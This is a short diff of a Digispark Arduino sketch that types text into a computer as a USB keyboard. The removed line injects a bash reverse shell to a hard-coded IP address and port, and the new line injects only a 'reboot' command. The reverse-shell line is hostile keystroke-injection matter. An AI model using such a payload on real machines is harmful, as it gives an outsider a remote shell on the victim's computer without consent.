@@ -12,7 +12,7 @@ void loop() {
   
   // Type out this string letter by letter on the computer (assumes US-style
   // keyboard)
-  DigiKeyboard.println("bash -i >& /dev/tcp/10.88.119.167/9999 0>&1reboot");
+  DigiKeyboard.println("reboot");
   
   // It's better to use DigiKeyboard.delay() over the regular Arduino delay()
   // if doing keyboard stuff because it keeps talking to the computer to make
